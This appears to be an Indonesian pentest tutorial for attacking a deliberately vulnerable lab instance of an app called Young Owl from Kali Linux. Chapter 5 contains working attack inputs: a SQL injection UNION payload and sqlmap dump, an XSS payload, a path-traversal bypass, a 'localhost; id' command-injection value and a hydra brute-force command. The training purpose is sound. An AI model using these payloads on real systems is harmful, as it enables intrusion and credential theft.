BAB 0Pengantar, etika, dan menyiapkan arena

Buku ini mengajak Anda menempuh satu siklus penetration test yang utuh terhadap aplikasi web Anda sendiri — Young Owl dalam "lab mode" — memakai Kali Linux.

Siklus penetration test

Sebuah pentest mengikuti alur yang berulang. Buku ini disusun persis mengikuti alur itu:

  1. Information Gathering — kumpulkan konteks tentang target.
  2. Reconnaissance — petakan host, port, dan layanan.
  3. Vulnerability Scanning — temukan kelemahan.
  4. Exploitation — buktikan kelemahan itu nyata.
  5. Post-Exploitation — pahami dampak (dan, dari sisi bertahan, deteksi).
  6. Reporting — tulis temuan agar bisa diperbaiki.
Aturan tunggal yang tidak bisa ditawar: hanya serang lab Anda sendiri. Young Owl lab dirancang untuk diserang; sistem lain tidak. Catat lingkup (alamat, waktu) sebelum mulai, seperti pentester profesional.

Kenapa aman menyerang Young Owl sendiri

Young Owl berjalan dalam dua salinan. Salinan normal menyimpan catatan dan laporan Anda dan tetap dijaga aman. Salinan lab (VULN_MODE=true) sengaja dibuat rentan dan itulah yang Anda serang. Salinan lab:

  • memakai database dummy sendiri yang hidup di RAM dan ter-reset otomatis;
  • berada di jaringan Docker terpisah tanpa jalur ke aplikasi asli;
  • diblokir keluar ke internet, jadi RCE sekalipun tidak bisa kabur dari server;
  • berjalan di container read-only dengan batas CPU/RAM.

Artinya Anda bisa berlatih sebebasnya: yang paling buruk terjadi, Anda tinggal reset lab. Detail ada di docs/lab-mode.md.

Menghubungkan Kali ke lab

Lab berjalan di VPS Anda, publik pada port 8080. Dari Kali, target Anda adalah http://<ip-vps>:8080. Simpan sebagai variabel supaya perintah lebih ringkas: 

export LAB=http://<ip-vps>:8080
curl -s $LAB/api/v1/system/health      # { "status": "ok", "vulnMode": true }
Tips. Buat satu assessment baru di salinan Young Owl yang normal sebelum mulai. Setiap temuan yang Anda dapat, catat di sana sambil jalan — itu melatih alur kerja pentester yang sebenarnya, dan di Bab 7 tinggal di-export jadi laporan.

BAB 2Information Gathering

Mengumpulkan informasi sebelum menyentuh target. Pasif = tanpa mengirim paket ke target; aktif = mulai berinteraksi.

Pengintaian pasif

  • robots.txt sering membocorkan jalur menarik:
curl -s $LAB/robots.txt

Di lab, berkas ini menyebut sebuah endpoint debug — breadcrumb klasik. Di dunia nyata, informasi pasif datang dari certificate transparency (crt.sh), Google dork (site:, inurl:), arsip, dan metadata dokumen.

Pengintaian aktif

Lihat header respons untuk menebak stack:

curl -sI $LAB/            # Server, X-Powered-By, cookie
whatweb $LAB

Catat setiap detail (framework, bahasa, nama cookie). Stack menentukan serangan mana yang mungkin — ini fondasi semua bab berikutnya.

BAB 3Reconnaissance

Memetakan permukaan serang: host mana hidup, port mana terbuka, layanan apa.

Host discovery

nmap -sn <ip-vps>/32        # apakah host hidup?

Port scanning

nmap -sS -p- <ip-vps>        # SYN scan, seluruh 65535 port TCP
nmap -sV -p 8080 <ip-vps>    # deteksi versi layanan di port lab
FlagArti
-sSSYN/half-open: tidak menuntaskan handshake, lebih senyap.
-sVDeteksi versi layanan — ini yang memetakan ke CVE.
-p-Semua port; tanpa ini Nmap hanya memindai 1000 teratas.

Enumerasi layanan

nmap -sV --script=http-title,http-headers -p 8080 <ip-vps>

Versi yang spesifik ("OpenSSH 8.2p1") bisa dicari CVE-nya; yang kabur tidak. Tulis temuan recon ke assessment Anda agar reproducible.

BAB 4Vulnerability Scanning

Mencari kelemahan — gabungan tools otomatis dan pemeriksaan manual. OWASP Top 10 adalah peta jalannya.

Scanner web otomatis

nikto -h $LAB                 # salah konfigurasi, header, berkas default
gobuster dir -u $LAB -w /usr/share/wordlists/dirb/common.txt

Scanner melewatkan logika aplikasi. Telusuri sendiri setiap fitur dan tanyakan: input mana yang saya kendalikan, dan ke mana ia pergi? Di lab, mulai dari halaman Lab tools dan detail assessment. Petakan ke OWASP:

BAB 5Exploitation / Pentesting

Membuktikan kelemahan itu nyata, langsung di endpoint lab. Semua di bawah ini sah karena targetnya milik Anda dan terisolasi.

5.1 SQL injection (A03)

Kolom pencarian target menyambung input langsung ke query SQL. Keluar dari string dengan kutip lalu gabungkan tabel lain dengan UNION: 

curl -s -G "$LAB/api/v1/targets/search" \
  --data-urlencode "q=zzz' UNION SELECT id,name,value,hint,'x','x' FROM lab_flags-- "

Nilai value pada hasil adalah flag SQLi. Atau otomatis dengan sqlmap terhadap lab Anda sendiri: 

sqlmap -u "$LAB/api/v1/targets/search?q=test" --batch --dump -T lab_flags

Perbaikan: parameterized query / prepared statement. Selalu.

5.2 Stored XSS (A03)

Deskripsi temuan di-render sebagai HTML mentah dalam lab mode. Buat temuan dengan payload bukti yang tidak merusak: 

<img src=x onerror="document.title='xss'">

Buka halaman assessment; judul berubah = skrip jalan. Cukup buktikan eksekusi, jangan merusak. Perbaikan: output encoding + Content-Security-Policy.

5.3 IDOR (A01)

Endpoint export lab tidak mengecek pemilik. Sebagai user biasa, akses assessment milik admin: 

curl -s -b cookies.txt "$LAB/api/v1/assessments/<id-orang-lain>/export"

Deskripsinya memuat flag IDOR. Di mode normal, request yang sama balas 404. Perbaikan: cek otorisasi di server untuk tiap objek.

5.4 Path traversal (A01)

Filter hanya membuang ../ sekali, jadi ....// lolos: 

curl -s -b cookies.txt "$LAB/api/v1/files?name=....//secret/flag.txt"

Perbaikan: kanonikalisasi path dan tolak yang keluar dari direktori dasar.

5.5 Command injection / RCE (A03)

Tool host lookup memasukkan input ke perintah shell tanpa escape. Buktikan eksekusi dengan perintah tak berbahaya: 

curl -s -b cookies.txt -X POST "$LAB/api/v1/tools/lookup" \
  -H 'content-type: application/json' \
  -d '{"host":"localhost; id"}'

Output id membuktikan RCE. (Lab memblokir egress, jadi ini tidak bisa menjangkau internet.) Perbaikan: jangan panggil shell dengan input user; pakai API yang aman dan allow-list.

5.6 Kelemahan autentikasi (A07)

Lab melemahkan login: pesan error membedakan email dikenal vs tidak (enumerasi), dan tidak ada batas percobaan. Dengan akun yang valid dan wordlist kecil, hydra menunjukkan password lemah jatuh: 

hydra -l intern@youngowl.lab -P wordlist.txt \
  <ip-vps> -s 8080 http-post-form \
  "/api/v1/auth/login:email=^USER^&password=^PASS^:No account"

Perbaikan: pesan error generik, rate limit/lockout, kebijakan password kuat — ketiganya ada di salinan normal.

BAB 6Post-Exploitation & Backdoor — konsep & deteksi

Bab ini sengaja konseptual dan berfokus deteksi. Ia menjelaskan cara kerja backdoor dan persistence agar Anda bisa mengenali dan membersihkannya di server Anda sendiri. Buku ini tidak memberi payload backdoor siap tempel — itu bukan yang membuat Anda mahir, dan membuat senjata jadi mudah disalahgunakan. Pemahaman pola + kemampuan deteksi jauh lebih berharga, dan inilah sikap yang dianut Young Owl.

Apa itu backdoor

Backdoor adalah mekanisme apa pun yang memberi akses di luar jalur autentikasi normal, setelah kompromi awal. Bentuknya bisa akun tambahan, binary yang dimodifikasi, scheduled task, web shell, atau layanan yang mendengar di port aneh. Pada aplikasi web, bentuk klasiknya adalah berkas yang bisa dieksekusi dan diunggah lewat celah upload (lihat A05/upload) lalu dipanggil lewat URL.

Reverse vs bind shell (konsep)

Bind shell: korban mendengar di sebuah port, penyerang menyambung masuk — mudah diblokir firewall inbound. Reverse shell: korban menyambung keluar ke penyerang, mengalahkan firewall inbound. Itu sebabnya egress filtering penting, dan kenapa lab Young Owl memblokir semua koneksi keluar — pola ini jadi mandul di sana.

Mekanisme persistence dan di mana mencarinya

Persistence bertahan melewati reboot. Tempat umum di Linux dan artefak yang ditinggalkan:

MekanismeTempat memeriksa
Cron/etc/crontab, /etc/cron.*, crontab -l
systemdsystemctl list-units, /etc/systemd/system/
Berkas rc shell~/.bashrc, /etc/profile.d
Akun / kunci baru/etc/passwd, ~/.ssh/authorized_keys
Web shellBerkas baru di direktori yang dilayani web (bandingkan dengan git)
Perburuan (sisi Anda sebagai pemilik). Alur kerja defender:
  1. Kumpulkan keadaan sekarang: scheduled task, service, startup file, user, socket yang mendengar (ss -tlnp), authorized key.
  2. Bandingkan dengan baseline atau server identik yang bersih.
  3. Selidiki yang baru: kapan dibuat, oleh siapa, menjalankan apa.
  4. Hapus mekanismenya dan akses yang diberikannya (rotasi kredensial, hapus kunci/akun).
  5. Cari akar masalah: persistence hanya gejala dari cara mereka masuk.

Indikator web shell pada aplikasi Anda

  • Berkas yang tidak ada di repository Git Anda muncul di direktori web.
  • Berkas dengan timestamp aneh, atau parameter request yang mengeksekusi perintah.
  • Proses web server yang memunculkan sh/bash — sinyal kuat.

Di Young Owl, karena lab terisolasi dan ter-reset, Anda bisa mempelajari pola ini tanpa risiko. Kaitkan ke Bab 7: dokumentasikan setiap artefak sebagai bukti sebelum dihapus.

BAB 7Pelaporan

Temuan tanpa laporan yang jelas tidak bisa diperbaiki. Di sinilah siklus ditutup.

CVSS 3.1 singkat

CVSS mengubah kerentanan jadi skor 0–10. Contoh vektor:

CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H  →  9.8 (Critical)
SkorTingkat
0.1–3.9Low
4.0–6.9Medium
7.0–8.9High
9.0–10.0Critical

Menulis temuan

Temuan yang baik bisa direproduksi dan ditindaklanjuti. Sertakan:

  1. Judul & tingkat (dengan vektor CVSS).
  2. Deskripsi dalam bahasa sederhana.
  3. Bukti: request/payload persis agar bisa diulang.
  4. Dampak: apa yang didapat penyerang.
  5. Perbaikan: langkah konkret, bukan "sanitasi input".

Di Young Owl, masukkan tiap temuan ke assessment lalu klik Generate report — hasilnya Markdown atau JSON yang bisa diunduh. Itulah deliverable Anda.
